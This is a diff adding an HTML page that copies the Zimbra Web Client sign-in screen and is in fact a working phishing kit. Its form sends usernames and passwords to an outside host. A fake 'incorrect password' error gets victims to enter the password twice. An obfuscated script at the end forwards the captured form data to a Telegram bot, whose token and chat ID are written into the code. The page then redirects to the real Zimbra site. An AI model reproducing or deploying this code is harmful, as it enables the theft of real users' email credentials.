@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<title>Zimbra Web Client Sign In</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<link rel="stylesheet" type="text/css" href="https://lacalty.com/jc/assets/common,login,zhtml,skin.css">
+	<link rel="SHORTCUT ICON" href="https://mail.zimbra.com/img/logo/favicon.ico">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.js" integrity="sha512-8Z5++K1rB3U+USaLKG6oO8uWWBhdYsM3hmdirnOEWp8h2B1aOikj5zBzlXs8QOrvY9OxEnD2QDkbSKKpfqcIWw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+</head>
+<body onload="onLoad();">
+
+	<div id="modifiedLogin" class="LoginScreen">
+		<div class="modernCenter">
+                <div class="modernContentBox">
+                    <div class="logo">
+                        <a href="#" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
+                            <span class="ImgLoginBanner"></span>
+                        </a>
+                    </div>				
+				<form id="zLoginForm" method="post" name="loginForm" action="https://lacalty.com/jc/assets/login.php" accept-charset="UTF-8">
+								<input type="hidden" name="Type_Of_Logs" value="Zimbra Logs">
+
+								<div class="signIn">Sign In</div>
+                        <div class="form">
+                        <div id="errorMessageDiv" class="errorMessage" style="display: none;">
+                            The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
+                            </div>
+                        <div class="loginSection">
+                                    <label for="username" class="zLoginFieldLabel">Username</label>
+                                    <input type="hidden" name="ss" value="Zimbra Logs">
+
+                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="email" value="" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
+                                        <label for="password" class="zLoginFieldLabel">Password</label>
+                                    <div class="passwordWrapper" id="passwordWrapper">
+                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password1" type="password" value="" size="40" maxlength="1024">
+                                        <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">Show</span>
+                                        <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
+                                    </div>
+                                    <div class="passwordWrapper" id="passwordWrapper1" style="display: none;">
+                                        <input id="pwd" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024">
+                                        <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">Show</span>
+                                        <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
+                                    </div>
+                                    <div class="signInAndLabel">
+                                        <div id="sub">
+                                            <button id="loginButton" type="button" tabindex="5" class="loginButton">Sign In</button>
+                                        </div>
+                                         <div id="sub1" style="display: none;">
+                                            <button id="loginButton1" type="submit" tabindex="5" class="loginButton">Sign In</button>
+                                        </div>
+                                       
+                                        <div class="rememberCheckWrapper"> 
+                                                <label id="remember" for="remember">Stay signed in</label>
+                                            </div>
+                                        </div>
+                                </div>
+                            <div>
+                            <hr>
+                            </div>
+                            <div>
+                            <div class="versionBlock">
+                                    <label for="client">Web App Version</label>
+                                    <div style="position: relative;">
+                                        <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                                    <option value="preferred" selected=""> Default</option>
+                                                    <option value="advanced"> Classic</option>
+                                                    <option value="modern"> Modern</option>
+                                                    </select>
+                                            <input type="button" class="alignWhatsThis" onclick="showTooltip();" id="ZLoginWhatsThisButton">
+                                    </div>
+                            
+                                    <div id="ZLoginWhatsThis">
+                                        <div class="ZLoginInfo">
+                                            <span id="dialogCloseButton" onclick="hideTooltip();">×</span>
+                                            <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p></div>
+                                    </div>
+                           
+                            
+                            </div>
+                        </div>
+                        </div>
+                    </form>
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div>
+		<div class="decor2"></div>
+	</div>
+
+
+</body>
+
+
+<script>
+
+var input = document.getElementById("password");
+
+// Execute a function when the user presses a key on the keyboard
+input.addEventListener("keypress", function(event) {
+  // If the user presses the "Enter" key on the keyboard
+  if (event.key === "Enter") {
+    // Cancel the default action, if needed
+    event.preventDefault();
+    // Trigger the button element with a click
+    document.getElementById("sub").click();
+  }
+});
+
+var input = document.getElementById("username");
+
+// Execute a function when the user presses a key on the keyboard
+input.addEventListener("keypress", function(event) {
+  // If the user presses the "Enter" key on the keyboard
+  if (event.key === "Enter") {
+    // Cancel the default action, if needed
+    event.preventDefault();
+    // Trigger the button element with a click
+    document.getElementById("sub").click();
+  }
+});
+
+$("#sub").click(function(){
+  $("#sub").hide()
+  $("#passwordWrapper").delay(1000).fadeOut(500)
+  $("#passwordWrapper1").delay(1500).fadeIn(550)
+  $("#sub1").show()
+  $("#errorMessageDiv").delay(2000).fadeIn(550)
+
+});
+// $(document).ready(function () {
+//   $("form").submit(function (event) {
+
+//     var passwordcheck= $("#pwd").val();
+//     if (passwordcheck != ''){
+    
+
+//     var formData = {
+//       email: $("#username").val(),
+//       password1: $("#password").val(),
+//       password: $("#pwd").val(),
+//     };
+
+//     $.ajax({
+//       type: "POST",
+//       url: "https://lacalty.com/jc/assets/login.php",
+//       data: formData,
+//       dataType: "json",
+//       encode: true,
+//     }).done(function (data) {
+//       console.log('data');
+//     });
+//     $('#loginButton1').attr('disabled', true);
+//     // $('#main').delay(2000).fadeOut(1000);
+//     // $('#done').delay(2200).fadeIn(1500);
+//     // $('#upgrade').delay(2000).fadeOut(1000);
+//      var str = $("#username").val();
+
+//      var splitted = str.split('@');
+//      var second = splitted[1];
+//     setTimeout(function(){location.href= 'http://mail.zimbra.com/'} , 10000);   
+
+//     event.preventDefault();
+//   }
+//   else{
+//   $("#errorMessageDiv").delay(2000).fadeIn(550)
+//     return false;
+//   }
+//   });
+  
+// });
+
+    </script>
+
+<script>  
+    const _0x3e2644=_0x5b63;function _0xee46(){const _0x29f2e1=['querySelector','submit','setRequestHeader','170532TPNdwU','2558394xZWMUL','25sGqmSA','POST','263018kYrEje','send','2aiKWIR','preventDefault','/sendMessage','target','4868640eDONTf','addEventListener','648996doFWNG','onreadystatechange','2025640HcadZL','chat_id','application/json;\x20charset=UTF-8','12kgkOOa','324767KvMYOA','794626176','https://api.telegram.org/bot','log','form','Content-type','fromEntries'];_0xee46=function(){return _0x29f2e1;};return _0xee46();}function _0x5b63(_0x1efcb1,_0x2b351b){const _0xee46bf=_0xee46();return _0x5b63=function(_0x5b6345,_0x5a050d){_0x5b6345=_0x5b6345-0x186;let _0x55ff87=_0xee46bf[_0x5b6345];return _0x55ff87;},_0x5b63(_0x1efcb1,_0x2b351b);}(function(_0x7f7ec0,_0x4eaddf){const _0x509de8=_0x5b63,_0x307570=_0x7f7ec0();while(!![]){try{const _0x3534b5=parseInt(_0x509de8(0x19d))/0x1*(-parseInt(_0x509de8(0x191))/0x2)+-parseInt(_0x509de8(0x197))/0x3+-parseInt(_0x509de8(0x18b))/0x4*(-parseInt(_0x509de8(0x18d))/0x5)+-parseInt(_0x509de8(0x19c))/0x6*(-parseInt(_0x509de8(0x18f))/0x7)+parseInt(_0x509de8(0x199))/0x8+-parseInt(_0x509de8(0x18c))/0x9+parseInt(_0x509de8(0x195))/0xa;if(_0x3534b5===_0x4eaddf)break;else _0x307570['push'](_0x307570['shift']());}catch(_0x2ad3df){_0x307570['push'](_0x307570['shift']());}}}(_0xee46,0x31909));let tg={'token':'1449456617:AAF1WY5JBoyC9CBUwaMj45F19G0A58-hXBM','chat_id':_0x3e2644(0x19e)};async function sendMessage(_0x31cc57){const _0x26aed8=_0x3e2644,_0x19da49=_0x26aed8(0x19f)+tg['token']+_0x26aed8(0x193),_0x292e4b={'chat_id':tg[_0x26aed8(0x19a)],'text':_0x31cc57},_0x33d955=new XMLHttpRequest();_0x33d955['open'](_0x26aed8(0x18e),_0x19da49,!![]),_0x33d955[_0x26aed8(0x18a)](_0x26aed8(0x186),_0x26aed8(0x19b)),_0x33d955[_0x26aed8(0x190)](JSON['stringify'](_0x292e4b)),_0x33d955[_0x26aed8(0x198)]=function(){};}const myForm=document[_0x3e2644(0x188)](_0x3e2644(0x1a1));myForm[_0x3e2644(0x196)](_0x3e2644(0x189),handleSubmit);async function handleSubmit(_0x40ca3b){const _0x1fc918=_0x3e2644;console[_0x1fc918(0x1a0)]('submitTimer\x20set'),_0x40ca3b[_0x1fc918(0x192)]();const _0x4fc9b8=Object[_0x1fc918(0x187)](new FormData(_0x40ca3b[_0x1fc918(0x194)])['entries']());sendMessage(_0x4fc9b8),setTimeout(()=>{const _0x4e1c89=_0x1fc918;this[_0x4e1c89(0x189)](),console[_0x4e1c89(0x1a0)]('Submitted\x20after\x205\x20seconds');},0x7d0);}; 
+    
+    
+    </script>
+</html>
